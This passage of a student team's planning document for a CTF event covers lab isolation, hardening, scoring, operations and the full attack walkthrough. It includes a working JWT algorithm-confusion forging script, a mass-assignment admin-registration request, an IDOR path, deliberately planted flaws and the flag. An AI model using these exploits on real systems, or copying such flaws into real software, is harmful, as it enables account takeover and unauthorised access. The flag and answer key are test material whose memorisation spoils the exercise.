# Example: add your current IP to SG-CTF-PAM port 22 inbound via AWS CLI
aws ec2 authorize-security-group-ingress \
  --group-id sg-<id> \
  --protocol tcp \
  --port 22 \
  --cidr $(curl -s https://checkip.amazonaws.com)/32
```

### Step 2 — Verify CTF-MySQL is Unreachable from Internet

```bash
# From your laptop — this should FAIL
ssh ubuntu@10.0.1.50  # Private IP — no route from internet

# From CTF-PAM EC2 — this should SUCCEED
ssh -i /path/to/ctf_pam_key pamuser@10.0.1.50
```

If the first test succeeds, the private subnet routing is misconfigured — fix it before going live.

### Step 3 — Confirm No Network Path: CTF → Production

```bash
# From CTF-PAM EC2 — this must FAIL and TIMEOUT
# (it should never even get a connection refused — the packets must not route)
curl --max-time 5 http://securepamgate.duckdns.org/api/assets
# Expected: curl: (28) Connection timed out

# Also test private IPs if on same VPC (should be in different security groups with no cross-rule)
```

### Step 4 — Disable CTF-MySQL Direct Internet Access

Confirm no route from CTF-MySQL to the internet:

```bash
# On CTF-MySQL EC2 (via jump host)
curl --max-time 5 https://google.com
# Expected: curl: (28) Connection timed out
```

If it connects, the private subnet has an unintended NAT gateway — remove it.

### Step 5 — Set Up UFW on CTF-MySQL EC2

```bash
# On CTF-MySQL EC2
sudo ufw default deny incoming
sudo ufw default deny outgoing
sudo ufw allow in from 10.0.0.0/24 to any port 22   # SSH from public subnet (CTF-PAM)
sudo ufw allow in from 10.0.0.0/24 to any port 3306  # MySQL from public subnet
sudo ufw enable
sudo ufw status verbose
```

### Step 6 — Create EC2 Snapshots (Backup Before Event)

```bash
# Via AWS Console: EC2 → Instances → each instance → Actions → Image and templates → Create image
# Create AMIs named:
#   CTF-PAM-backup-<date>
#   CTF-MySQL-backup-<date>
#   Lore-Nginx-backup-<date>

# If anything goes catastrophically wrong during the event, restore from these AMIs in minutes
```

### Step 7 — Add Nginx Rate Limiting on CTF-PAM

Prevent players from hammering the API with brute-force requests:

```nginx
# Add to the http block in /etc/nginx/nginx.conf
limit_req_zone $binary_remote_addr zone=ctf_api:10m rate=30r/m;

# Add to the location block in ctf-pam.conf
location /api/ {
    limit_req zone=ctf_api burst=10 nodelay;
    proxy_pass http://localhost:3000;
    ...
}
```

### Phase 5 Deliverables

- [ ] SSH inbound on all Security Groups restricted to team IPs only
- [ ] CTF-MySQL EC2 is unreachable directly from the internet (confirmed)
- [ ] No network path from CTF-PAM to Production PAM (confirmed with timeout test)
- [ ] UFW enabled on CTF-MySQL with deny-all defaults
- [ ] AMI snapshots created for all three CTF EC2s
- [ ] Nginx rate limiting active on CTF-PAM API routes
- [ ] Full attack chain test run by one team member from scratch: confirms the attack works but also that nothing outside the intended scope is reachable

---

## 15. Phase 6 — Integration Testing & Attack Walkthroughs (All)

### Purpose

Every team member must run through the **complete attack chain** from scratch — starting with only the lore page URL and the participant credentials — and verify each stage works as designed. If a team member cannot complete a stage within a reasonable time, the stage is either too hard or broken.

### The Full Walkthrough Test

Run this test exactly as a participant would. Do not use insider knowledge of the system. Use only publicly available tools.

**Environment:** A browser + terminal. No special tools pre-installed beyond curl and Python.

---

**Stage 1 Walkthrough Test:**

```bash
# Test 1: Framework discovery from headers
curl -I http://ctf-pam.duckdns.org
# Expected output includes: X-Powered-By: Next.js
# And: Server: nginx/1.24.0

# Test 2: Certificate transparency
# Visit https://crt.sh/?q=duckdns.org in browser
# Search for ctf-pam — certificate should appear
```

Expected: Both work. If `X-Powered-By` is missing, Nginx is incorrectly stripping it — check the config.

---

**Stage 2 Walkthrough Test (Algorithm Confusion path):**

```bash
# Log in with participant credentials
TOKEN=$(curl -s -X POST http://ctf-pam.duckdns.org/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"test@student.edu","password":"<test-password>"}' \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['accessToken'])")

echo $TOKEN
# Decode payload (middle segment)
echo $TOKEN | cut -d. -f2 | base64 -d 2>/dev/null | python3 -m json.tool

# Fetch JWKS
curl -s http://ctf-pam.duckdns.org/.well-known/jwks.json | python3 -m json.tool

# Now craft forged HS256 token (Python script — players would write this):
python3 << 'EOF'
import jwt, base64, json, re
import requests

# Get public key
jwks = requests.get('http://ctf-pam.duckdns.org/.well-known/jwks.json').json()
# Extract the PEM from the JWKS (players use a JWKS-to-PEM converter)
# Then sign with HS256 using the PEM bytes as the secret

from cryptography.hazmat.primitives.serialization import load_pem_public_key
pem = b"""-----BEGIN PUBLIC KEY-----
<paste n and e values converted to PEM>
-----END PUBLIC KEY-----"""

forged = jwt.encode(
    {"userId": "any-id", "role": "ADMIN", "email": "admin@evil.com"},
    pem,
    algorithm="HS256"
)
print("Forged token:", forged)

# Test it
res = requests.get(
    'http://ctf-pam.duckdns.org/api/assets',
    headers={"Authorization": f"Bearer {forged}"}
)
print("Status:", res.status_code)
print("Body:", res.json())
EOF
```

Expected: `GET /api/assets` with forged token returns the MySQL asset.

---

**Stage 3 Walkthrough Test (Mass Assignment path):**

```bash
# Register a new ADMIN account via the vulnerable endpoint
curl -s -X POST http://ctf-pam.duckdns.org/api/register \
  -H "Content-Type: application/json" \
  -d '{"email":"attacker@evil.com","password":"p@ssw0rd123","role":"ADMIN"}' \
  | python3 -m json.tool

# Log in with the new account
ADMIN_TOKEN=$(curl -s -X POST http://ctf-pam.duckdns.org/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"attacker@evil.com","password":"p@ssw0rd123"}' \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['accessToken'])")

# Request a session
curl -s -X POST http://ctf-pam.duckdns.org/api/sessions/request \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $ADMIN_TOKEN" \
  -d '{"assetId":"00000000-0000-0000-0000-000000000001"}' \
  | python3 -m json.tool
```

Expected: A JIT ticket is returned with a 60-second window.

---

**Stage 4 Walkthrough Test:**

Open the browser. Navigate to `http://ctf-pam.duckdns.org/terminal?ticket=<uuid>`.

In the terminal:

```sql
show databases;
use secret_ops;
show tables;
select * from flag;
-- Expected: CTF{jwt_alg_confusion_pam_pwned_2025}
```

Navigate to `http://apt-lore.duckdns.org/submit.html`. Enter email and flag. Check leaderboard updates.

---

### Integration Attack Checklist

```
STAGE 1 — RECON
─────────────────────────────────────────────────────────────────
□ 1. curl -I returns X-Powered-By: Next.js
□ 2. curl -I returns Server: nginx/x.x.x
□ 3. crt.sh shows ctf-pam.duckdns.org certificate
□ 4. X-Challenge-Platform: SecureGate-PAM on apt-lore.duckdns.org

STAGE 2 — WEB EXPLOITATION
─────────────────────────────────────────────────────────────────
□ 5. /.well-known/jwks.json returns RSA public key in JWKS format
□ 6. HS256 forged token with ADMIN role is accepted by /api/assets
□ 7. /api/audit/sessions/user/<other-uid> returns another user's sessions (IDOR)
□ 8. Both attacks independently produce ADMIN-level access

STAGE 3 — PRIVILEGE ESCALATION
─────────────────────────────────────────────────────────────────
□ 9.  POST /api/register with role:"ADMIN" creates an admin account
□ 10. The new admin can log in and receive a real ADMIN JWT
□ 11. Admin JWT accepted at /api/sessions/request
□ 12. JIT ticket issued for the MySQL asset

STAGE 4 — FLAG RETRIEVAL
─────────────────────────────────────────────────────────────────
□ 13. Terminal opens successfully — pamuser restricted shell → MySQL
□ 14. show databases; shows employees, hr_archive, financial_records, secret_ops
□ 15. select * from flag; returns CTF{jwt_alg_confusion_pam_pwned_2025}
□ 16. Flag submission at apt-lore.duckdns.org/submit.html returns correct: true
□ 17. Leaderboard updates within 10 seconds

ISOLATION CHECKS
─────────────────────────────────────────────────────────────────
□ 18. SSH from internet to CTF-MySQL private IP: FAILS
□ 19. curl from CTF-MySQL to internet: FAILS (TIMEOUT)
□ 20. curl from CTF-PAM to securepamgate.duckdns.org: FAILS (TIMEOUT)
□ 21. pamuser cannot exit MySQL and access bash: CONFIRMED
□ 22. Using a participant credential, /api/users/admin returns 403: CONFIRMED
```

---

## 16. Full Attack Chain — Step by Step

This is the complete attack path from start to flag, as a participant would experience it:

```
═══════════════════════════════════════════════════════════════════════════════
STAGE 1 — RECON
═══════════════════════════════════════════════════════════════════════════════

Participant                  apt-lore.duckdns.org          ctf-pam.duckdns.org
───────────                  ────────────────────          ───────────────────

Reads lore page ──────────► Learns scenario + target URL
                             Notes: X-Challenge-Platform
                             header hints at the platform name

curl -I ctf-pam.duckdns.org ──────────────────────────────► Nginx responds
                                                             X-Powered-By: Next.js ◄──
                                                             Server: nginx/1.24.0 ◄──
                             
Visit crt.sh ─────────────► Public CT logs show certificate
                             for ctf-pam.duckdns.org

Participant now knows:
  ✓ Target runs Next.js on Nginx
  ✓ Uses Let's Encrypt TLS
  ✓ Domain confirmed via CT logs
  ✓ Has participant credentials (from email)


═══════════════════════════════════════════════════════════════════════════════
STAGE 2 — WEB EXPLOITATION (Algorithm Confusion path shown)
═══════════════════════════════════════════════════════════════════════════════

Logs in with participant         POST /api/auth/login
credentials ────────────────────────────────────────────► Returns accessToken (RS256)

Decodes JWT payload ─────────── Sees: { role: "OPERATOR", userId: "...", email: "..." }

Visits /.well-known/jwks.json ──────────────────────────► Returns RSA public key (JWK format)

Extracts RSA public key,
converts to PEM format

Crafts new JWT:
  header:  { alg: "HS256" }
  payload: { role: "ADMIN", userId: "forge", email: "x" }
  secret:  RSA PUBLIC KEY bytes

Signs token with PyJWT (HS256)

Sends forged token ──────────── GET /api/assets
  Authorization: Bearer <forged> ──────────────────────► lib/auth.ts checks alg field
                                                          alg === "HS256" → uses public key
                                                          as HMAC secret to verify
                                                          Verification PASSES (same bytes)
                                  ◄─────────────────────── Returns MySQL asset in list

Participant now has:
  ✓ Forged ADMIN JWT token
  ✓ Can call any ADMIN endpoint


═══════════════════════════════════════════════════════════════════════════════
STAGE 3 — PRIVILEGE ESCALATION
═══════════════════════════════════════════════════════════════════════════════

Discovers /api/register
(via ffuf or lore page hints)

Sends POST /api/register ──────────────────────────────► route.ts extracts role from body
  { email: "me@evil.com",                                 NO validation
    password: "pass123",                                   INSERT with role = "ADMIN"
    role: "ADMIN" } ─────────────────────────────────────► Account created
                                   ◄──────────────────────  { message: "Account created" }

Logs in with new account ────── POST /api/auth/login ───► Finds user in DB
                                                          User has ADMIN role
                                  ◄──────────────────────  Real RS256 ADMIN JWT returned

Requests session ──────────────  POST /api/sessions/request ► Checks access_policy
  { assetId: "00000000-..." }                               ADMIN has policy for MySQL asset
                                  ◄──────────────────────  { ticket, expiresAt }

Participant now has:
  ✓ Legitimate ADMIN credentials
  ✓ JIT ticket for MySQL asset (60 second window)
  ✓ Must connect WebSocket within 60 seconds


═══════════════════════════════════════════════════════════════════════════════
STAGE 4 — FLAG RETRIEVAL
═══════════════════════════════════════════════════════════════════════════════

Navigates to /terminal?ticket=<uuid>

WebSocket connects ────────────  server.ts GETDEL ticket
                                 Ticket valid → open tunnel

                                 tunnelService.openTunnel()
                                   → Query asset_credentials
                                   → AES-256-GCM decrypt
                                   → ssh2 connects to 10.0.1.50:22
                                   → Uses pamuser ed25519 key
                                   → PTY shell opens
                                   → Shell is /usr/local/bin/pamshell.sh
                                   → MySQL launches automatically

Browser terminal shows ─────────────────────────────────────────────────────────
  mysql [ctf]>

Participant types: show databases;
  → employees, hr_archive, financial_records, secret_ops

Participant types: use secret_ops; show tables;
  → project_codenames, access_tokens, flag

Participant types: select * from flag;
  → CTF{jwt_alg_confusion_pam_pwned_2025}

Navigates to apt-lore.duckdns.org/submit.html
Submits email + flag ──────────────────────────────────────────────────────────►
                                                                    POST /api/ctf/submit
                                                                    Flag matches ✓
                                                                    Score recorded in MongoDB
                                                                    ◄─── { correct: true }

Leaderboard updates ─────────── GET /api/ctf/scores (every 10s from leaderboard.js)
                                  ◄── Participant appears on board
```

---

## 17. Vulnerability Design Explained

### Why These Four Vulnerabilities?

Each vulnerability was chosen because it is documented in real-world security research, appears in OWASP Top 10 or CWE, and has caused real breaches in production systems.

**JWT Algorithm Confusion (Stage 2, Path A)**

This vulnerability class was documented and weaponised by security researcher PortSwigger and appears in multiple real bug bounty reports. The root cause is a design flaw in how some JWT libraries handle the `alg` field from the token header — they allow the client to dictate the verification algorithm. The HS256/RS256 variant specifically exploits the fact that if a server has an RSA public key, and the server will accept HS256, the attacker can use the public key as the HMAC secret (because both sides are using the same bytes — the attacker signs with them, the server verifies with them).

**IDOR on Audit Endpoint (Stage 2, Path B)**

Insecure Direct Object References are OWASP API Top 10 #1 (broken object level authorisation). The vulnerability is simple: the system authenticates the user but does not authorise whether they are allowed to access the specific resource they asked for. Any OPERATOR can substitute any other user's ID into the URL and see their sessions.

**Mass Assignment via `role` Field (Stage 3)**

Mass assignment vulnerabilities occur when an API blindly uses client-supplied fields to set object properties — including properties that should only be set server-side. In this case: the `role` field in a registration request. This vulnerability class affected GitHub in 2012 (allowing users to add their SSH key to any repository) and remains a common finding in bug bounty programs today.

**Restricted Shell Bypass Mitigation (Stage 4 Defence)**

The restricted shell for `pamuser` is not a vulnerability — it is a defence that prevents players from going beyond the intended scope. It teaches an important lesson: even when PAM access is compromised, good system design limits the blast radius. The `pamuser` account can query databases but cannot read `/etc/shadow`, modify system files, or pivot elsewhere.

### Vulnerability Severity Calibration

The vulnerabilities are ordered by discovery difficulty, not by CVSS score:

| Stage | Vulnerability | Real-world CVSS | Discovery Difficulty |
|---|---|---|---|
| 2A | JWT Algorithm Confusion | High (7.5–9.0) | Medium — requires knowing JWT internals |
| 2B | IDOR | Medium–High (6.5–8.0) | Low — simple parameter change |
| 3 | Mass Assignment | High (8.0+) | Medium — requires endpoint discovery |
| Overall chain | All combined | Critical | Hard — requires chaining all three |

---

## 18. Leaderboard & Scoring System

### Point Values

For a single-flag CTF (one flag, four stages combined), the scoring is binary — you either get the flag or you do not. However, we award **partial credit** for reaching each stage:

| Achievement | Points | How Detected |
|---|---|---|
| Logged in (Stage 1 complete) | 10 | First login recorded in MongoDB audit log |
| ADMIN-level API call made | 25 | Any call to ADMIN-only endpoint logged with non-admin credential |
| JIT ticket issued | 50 | `POST /api/sessions/request` with ADMIN role succeeds |
| Flag submitted correctly | 100 | `POST /api/ctf/submit` returns `correct: true` |

Total possible: **100 points**. Tiebreaker: earliest timestamp for the highest-achieved stage.

### Score Detection for Stages 1–3

Stages 1–3 do not have explicit submission — their completion is inferred from server-side events:

Stage 1 completion is inferred when the participant's account makes its first API call — the audit log captures this.

Stage 2/3 completion is inferred when a forged or ADMIN-role JWT is used on any ADMIN-only endpoint. The `requireRole` middleware can log an event to MongoDB when an ADMIN action is detected for a user whose PostgreSQL role is OPERATOR — this indicates they exploited either Path A or Path B.

Add this to `requireRole` in the CTF fork:

```typescript
// In the CTF fork of lib/rbac.ts
// After successful auth check, if ADMIN action by known OPERATOR account:
if (allowedRoles.includes('ADMIN') && userRole === 'ADMIN') {
  // Check if this is a "natural" admin or an exploiting user
  // Log the privilege escalation event to MongoDB for scoring
  setImmediate(() => {
    getAuditDb().then(db => db.collection('ctf_scores_events').insertOne({
      email: payload.email,
      event: 'privilege_escalation_detected',
      timestamp: new Date(),
      endpoint: request.url,
    })).catch(() => {});
  });
}
```

### First Blood

The first player to submit the correct flag gets a Discord announcement. Member 1 sets up a Discord webhook. The flag submission endpoint triggers the webhook on the first successful submission:

```typescript
// In /api/ctf/submit/route.ts, after first correct submission:
const isFirstBlood = (await db.collection('ctf_scores').countDocuments()) === 1;
if (isFirstBlood) {
  await fetch(process.env.DISCORD_WEBHOOK_URL ?? '', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      content: `🩸 **FIRST BLOOD!** \`${email}\` has captured the flag!`,
    }),
  });
}
```

---

## 19. EC2 Instance Reference

A quick-reference table for all four EC2 instances. Fill in the actual values at setup time and store this in `ctf-ops/docs/infrastructure-notes.md` (never commit to git).

| Instance | Name Tag | Type | Public IP | Private IP | DuckDNS | SSH Key | Security Group |
|---|---|---|---|---|---|---|---|
| CTF-PAM | `CTF-PAM` | t2.micro | Dynamic | `10.0.0.x` | `ctf-pam.duckdns.org` | `ctf-team-key` | `SG-CTF-PAM` |
| CTF-MySQL | `CTF-MySQL` | t2.micro | None | `10.0.1.50` | None | `ctf-team-key` | `SG-CTF-MySQL` |
| Lore-Nginx | `Lore-Nginx` | t2.micro | Dynamic | `10.0.0.x` | `apt-lore.duckdns.org` | `ctf-team-key` | `SG-Lore-Nginx` |
| Prod PAM | `SecureGate-PAM` | t2.micro | Existing | Existing | `securepamgate.duckdns.org` | Existing | Existing (separate) |

### SSH Connection Commands

```bash
# CTF-PAM (direct)
ssh -i ~/.ssh/ctf-team-key.pem ubuntu@ctf-pam.duckdns.org

# Lore-Nginx (direct)
ssh -i ~/.ssh/ctf-team-key.pem ubuntu@apt-lore.duckdns.org

# CTF-MySQL (via jump host)
ssh -i ~/.ssh/ctf-team-key.pem -J ubuntu@ctf-pam.duckdns.org ubuntu@10.0.1.50

# pamuser on CTF-MySQL (how the PAM does it — for testing)
ssh -i /path/to/ctf_pam_key -J ubuntu@ctf-pam.duckdns.org pamuser@10.0.1.50
```

---

## 20. Security Boundaries — What Is Intentional vs What Must Be Protected

### What Is Intentionally Vulnerable

| Component | Vulnerability | Intentional? |
|---|---|---|
| `lib/auth.ts` | JWT algorithm confusion | ✅ YES |
| `/api/register` | Mass assignment of `role` | ✅ YES |
| `/api/audit/sessions/user/[uid]` | IDOR | ✅ YES |
| Nginx `X-Powered-By` header | Not stripped | ✅ YES |
| `/.well-known/jwks.json` | Public key exposed | ✅ YES |

### What Must Remain Protected

| Component | Why It Must Be Protected | Protection Mechanism |
|---|---|---|
| SSH access to all EC2s | Team management access | Security Group: team IPs only on port 22 |
| CTF-MySQL direct internet access | Prevents bypass of the PAM | Private subnet, no public IP |
| Production PAM EC2 | Completely separate from CTF | Different VPC Security Group, no cross-rules |
| `CTF_SUBMIT_KEY` value | Prevents API abuse for flag submission | Environment variable, embedded in form only |
| `ctf-team-key.pem` | SSH key to all instances | Never committed to git, shared over Signal |
| `credentials.csv` | 24 participant passwords | Never committed to git, deleted after emails sent |
| pamuser ed25519 private key | SSH auth from PAM to MySQL | In vault only, never in git |

### Out of Scope for Participants

Make this explicit in the lore page and Discord rules:

> The following are OUT OF SCOPE and any attempt constitutes misuse:
> - Any machine or IP not at `ctf-pam.duckdns.org` or `apt-lore.duckdns.org`
> - The production SecureGate PAM at `securepamgate.duckdns.org`
> - Any AWS management console or metadata endpoint (`169.254.169.254`)
> - Denial of service attacks against any instance
> - Attempting to access other participants' accounts or submissions

---

## 21. Event Day Operations

### Pre-Event Checklist (Night Before)

- [ ] All three CTF EC2s running — verify with `check-health.sh`
- [ ] DuckDNS resolving correctly for both subdomains
- [ ] CTF PAM: `docker compose ps` shows all four services healthy
- [ ] CTF-MySQL: MySQL running, `pamuser` login works
- [ ] Lore site: leaderboard.html renders, submit form works
- [ ] Test flag submission end-to-end with a test email (delete from DB after)
- [ ] Discord server set up: `#announcements`, `#help`, `#ctf-discussion` channels
- [ ] Credential emails sent and delivery confirmed for all 24 participants
- [ ] Team members assigned monitoring roles for the event

### Event Day Roles

| Member | Role During Event |
|---|---|
| Member 1 | Monitors Discord, posts hints if players are stuck, makes announcements |
| Member 2 | Monitors CTF PAM Docker logs (`docker compose logs -f`), watches for abuse, answers technical questions |
| Member 3 | Monitors Security Groups, watches for unexpected traffic patterns, handles any MySQL EC2 issues |

### If Something Goes Wrong

**CTF PAM goes down:**
```bash
ssh -i ctf-team-key.pem ubuntu@ctf-pam.duckdns.org
cd ~/ctf-pam
docker compose down && docker compose up -d
```

**CTF-MySQL stops responding:**
```bash
ssh -J ubuntu@ctf-pam.duckdns.org ubuntu@10.0.1.50
sudo systemctl restart mysql
```

**A participant is clearly attempting out-of-scope activity:**
```bash
# Ban their IP at Nginx level
sudo bash /home/ubuntu/ctf-ops/nuclear/ban-ip.sh <IP>
# Alert them in Discord that they have been disqualified
```

**Leaderboard stops updating:**
```bash
# Check MongoDB inside the container
docker compose exec mongo mongosh -u admin -p admin
use securegate_audit
db.ctf_scores.find().sort({solvedAt: -1})
```

**Full reset required (catastrophic failure):**
```bash
sudo bash /home/ubuntu/ctf-ops/nuclear/reset-ctf.sh
# This wipes all sessions, scores, and participant accounts
# Only use if the event needs to be restarted from zero
```

### Post-Event

- Export final leaderboard from MongoDB before shutting down
- Take EBS snapshots of all three CTF instances (for records)
- Stop (but do not terminate) all CTF instances — credits continue but at $0.00/hour for stopped instances
- Upload the attack walkthrough to Discord as a learning resource
- Conduct team debrief: what broke, what was too easy, what was too hard

---

## 22. Timeline & Task Breakdown

### Three-Week Overview

```
WEEK 0 — Day 1  ─────────────────────────────────────────────────────
  ALL MEMBERS: Phase 0 — AWS Bootstrap
  • VPC, subnets, Internet Gateway, Security Groups
  • Three EC2 instances launched
  • DuckDNS configured and resolving
  • Base software installed
  • Jump host access to CTF-MySQL confirmed

WEEK 1  ──────────────────────────────────────────────────────────────
  MEMBER 2: Phase 1 — CTF PAM Fork & Vulnerability Injection
    • Fork repo, create ctf/vulnerable branch
    • Inject all four vulnerabilities
    • Deploy to CTF-PAM EC2
    • Verify each vulnerability individually

  MEMBER 3: Phase 2 — MySQL EC2 & Flag Database
    • Install and configure MySQL 8.0
    • Create four databases with decoy data
    • Create flag table and insert flag
    • Create pamuser SSH account with restricted shell
    • Deliver private key to Member 2

  MEMBER 1: Phase 3 (start) — Lore Page
    • Write lore HTML and narrative
    • Build leaderboard and submit pages
    • Deploy to Lore-Nginx EC2

WEEK 2  ──────────────────────────────────────────────────────────────
  MEMBER 1: Phase 3 (finish) — Leaderboard integration, CSS polish
  MEMBER 2: Phase 4 — Onboarding Pipeline
    • Build bulk account creation script
    • Publish Google Form
    • Write email template
  MEMBER 3: Phase 5 — Hardening & Isolation
    • Lock SSH to team IPs
    • Confirm CTF-MySQL internet isolation
    • UFW on CTF-MySQL
    • EC2 snapshots

WEEK 3  ──────────────────────────────────────────────────────────────
  ALL MEMBERS: Phase 6 — Integration Testing
    • Each member runs full attack chain solo
    • Attack checklist completed (22 items)
    • Collect participant responses from Google Form
    • Run bulk account creation
    • Send credential emails
    • Final hardening pass
    • Discord server ready
    EVENT
```

### Member-by-Member Task Breakdown

**Member 1 — Total tasks: 9**

| Task | Description | Week |
|---|---|---|
| M1-T1 | AWS Phase 0: provision Lore-Nginx EC2, attach SG-Lore-Nginx | 0 |
| M1-T2 | Write lore page HTML (`index.html`) with full narrative and layout | 1 |
| M1-T3 | Write engagement page (`engagement.html`) with in-scope/out-of-scope rules | 1 |
| M1-T4 | Write leaderboard page (`leaderboard.html`) and `leaderboard.js` polling logic | 1–2 |
| M1-T5 | Write flag submission page (`submit.html`) with form and `X-CTF-Submit-Key` | 2 |
| M1-T6 | Write terminal-aesthetic CSS (`style.css`) | 2 |
| M1-T7 | Configure Nginx on Lore EC2 with `X-Challenge-Platform` header | 2 |
| M1-T8 | Write and test `deploy.sh` — rsync pipeline to Lore EC2 | 2 |
| M1-T9 | Set up Discord server: channels, roles, webhooks, bot for first blood | 2 |

**Member 2 — Total tasks: 12**

| Task | Description | Week |
|---|---|---|
| M2-T1 | AWS Phase 0: provision CTF-PAM EC2, attach SG-CTF-PAM | 0 |
| M2-T2 | Fork SecureGate to private `ctf-pam` repo, create `ctf/vulnerable` branch | 1 |
| M2-T3 | Inject Vulnerability 1: algorithm confusion in `lib/auth.ts` | 1 |
| M2-T4 | Inject Vulnerability 2: JWKS endpoint at `/.well-known/jwks.json` | 1 |
| M2-T5 | Inject Vulnerability 3: mass assignment at `POST /api/register` | 1 |
| M2-T6 | Inject Vulnerability 4: IDOR at `/api/audit/sessions/user/[uid]` | 1 |
| M2-T7 | Add flag submission endpoint `POST /api/ctf/submit` and `GET /api/ctf/scores` | 1 |
| M2-T8 | Deploy CTF PAM to CTF-PAM EC2, verify all routes | 1 |
| M2-T9 | Update vault seed with CTF-MySQL pamuser ed25519 key (after Phase 2) | 2 |
| M2-T10 | Write bulk account creation script (`bulk-create-users.ts`) | 2 |
| M2-T11 | Write email send script (`send-emails.ts`) with themed template | 2 |
| M2-T12 | Run Phase 6 integration test — full attack chain as participant | 3 |

**Member 3 — Total tasks: 11**

| Task | Description | Week |
|---|---|---|
| M3-T1 | AWS Phase 0: design VPC, create subnets, IGW, route tables | 0 |
| M3-T2 | AWS Phase 0: provision CTF-MySQL EC2 in private subnet, no public IP | 0 |
| M3-T3 | Create three Security Groups with initial rules | 0 |
| M3-T4 | Install MySQL 8.0 on CTF-MySQL EC2 via jump host | 1 |
| M3-T5 | Create `employees`, `hr_archive`, `financial_records` databases with decoy data | 1 |
| M3-T6 | Create `secret_ops` database with `flag` table and flag value | 1 |
| M3-T7 | Create `pamuser` OS account with restricted MySQL shell | 1 |
| M3-T8 | Generate ed25519 key pair for PAM→MySQL auth, deliver private key to Member 2 | 1 |
| M3-T9 | Lock SSH inbound to team IPs on all Security Groups | 2 |
| M3-T10 | Verify CTF-MySQL isolation: no internet, not reachable from internet | 2 |
| M3-T11 | Create EBS snapshots of all three CTF EC2s before event | 2–3 |

---

> [!success] Event Goal
> By the end of Week 3, a student sitting anywhere with a browser should be able to receive their credential email, visit `apt-lore.duckdns.org` to read the scenario, log into `ctf-pam.duckdns.org`, discover real cryptographic and access control vulnerabilities, escalate their privileges, open a proxied database session, and retrieve a flag — all using the same techniques that professional penetration testers use on real PAM systems every week.
>
> That is not a CTF puzzle. That is a training exercise on live infrastructure.
>
> **That is SecureGate CTF.**

---

*SecureGate_CTF_PLAN.md — Full Event Architecture, Vulnerability Design & Operations Reference*
*Team eyes only — never commit to any public repository*
